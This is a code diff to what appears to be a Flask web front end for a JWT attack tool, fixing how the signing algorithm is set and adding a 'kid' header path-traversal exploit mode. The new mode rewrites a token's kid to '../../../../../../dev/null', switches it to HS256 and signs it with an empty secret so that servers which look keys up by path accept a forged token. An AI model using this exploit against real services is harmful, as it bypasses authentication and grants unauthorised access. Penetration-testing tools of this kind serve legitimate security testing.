@@ -404,12 +404,22 @@ def forge():
             # opted in to the default via add_typ.
             if "typ" not in header and not add_typ:
                 header["typ"] = None
+            # jwt.encode() reads "alg" from the headers dict itself when
+            # present, and uses THAT to pick the signing algorithm, not
+            # the separate `algorithm=` argument. So if a token loaded
+            # into the editor still has its old "alg" (e.g. "RS256") in
+            # the header JSON and you only change the dropdown to HS256,
+            # PyJWT would silently try to sign with the stale alg's
+            # algorithm instead of what you actually selected. Force it
+            # to match what was picked, every time.
+            header["alg"] = sign_alg.upper()
             token = encode_hmac_allow_empty(payload, header, secret, sign_alg)
         else:
             if not private_key:
                 return jsonify({"error": "This algorithm needs a private key"}), 400
             if "typ" not in header and not add_typ:
                 header["typ"] = None
+            header["alg"] = sign_alg.upper()  # see note above, same stale-alg hazard applies here
             token = jwt.encode(payload, private_key, algorithm=sign_alg.upper(), headers=header)
     except Exception as exc:
         return jsonify({"error": f"Could not build the token: {exc}"}), 400
@@ -471,6 +481,7 @@ def exploit():
     pubkey = data.get("pubkey", "")
     jwks_url = data.get("jwks_url", "").strip()
     kid_override = data.get("kid", "").strip()
+    kid_path = data.get("kid_path", "").strip()
 
     if not token or not code:
         return jsonify({"error": "Token and exploit code are required"}), 400
@@ -485,6 +496,44 @@ def exploit():
         with os.fdopen(fd, "w") as f:
             f.write(pubkey)
         args += ["-pk", tmp_key_path]
+    elif code == "t":
+        # kid header path traversal: not one of jwt_tool's own -X codes,
+        # so build it ourselves the same way as Spoof JWKS above. Point
+        # kid at a predictable file the server will read as the HMAC
+        # secret when it looks the key up by that path; /dev/null is
+        # empty on any Linux target, so the "secret" it reads back is an
+        # empty string, and that's exactly what has to sign this token.
+        parts = token.split(".")
+        if len(parts) < 2:
+            return jsonify({"error": "That does not look like a JWT"}), 400
+        try:
+            header = json.loads(b64url_decode(parts[0]))
+            payload = json.loads(b64url_decode(parts[1]))
+        except Exception as exc:
+            return jsonify({"error": f"Could not decode token: {exc}"}), 400
+        if not isinstance(header, dict) or not isinstance(payload, dict):
+            return jsonify({"error": "Token header/payload must be JSON objects"}), 400
+
+        path = kid_path or "../../../../../../dev/null"
+        header["kid"] = path
+        header["alg"] = "HS256"
+        if "typ" not in header:
+            header["typ"] = None  # don't let PyJWT silently add one, see /api/forge
+
+        try:
+            new_token = encode_hmac_allow_empty(payload, header, "", "hs256")
+        except Exception as exc:
+            return jsonify({"error": f"Could not sign the token: {exc}"}), 400
+
+        output = (
+            f'kid set to "{path}", signed with alg: HS256 and an empty-string secret, '
+            "the assumption being that path resolves to an empty (or otherwise "
+            "predictable) file on the server and it reads that file's contents as "
+            "the HMAC key. If this doesn't work, the server may store its keys "
+            "somewhere else, try a different path.\n\n"
+            f"New JWT:\n\n{new_token}"
+        )
+        return jsonify({"output": output})
     elif code == "s":
         # Always self-sign with EasyJWT's built-in default key, rather than
         # calling jwt_tool (which would generate its own random, unhosted
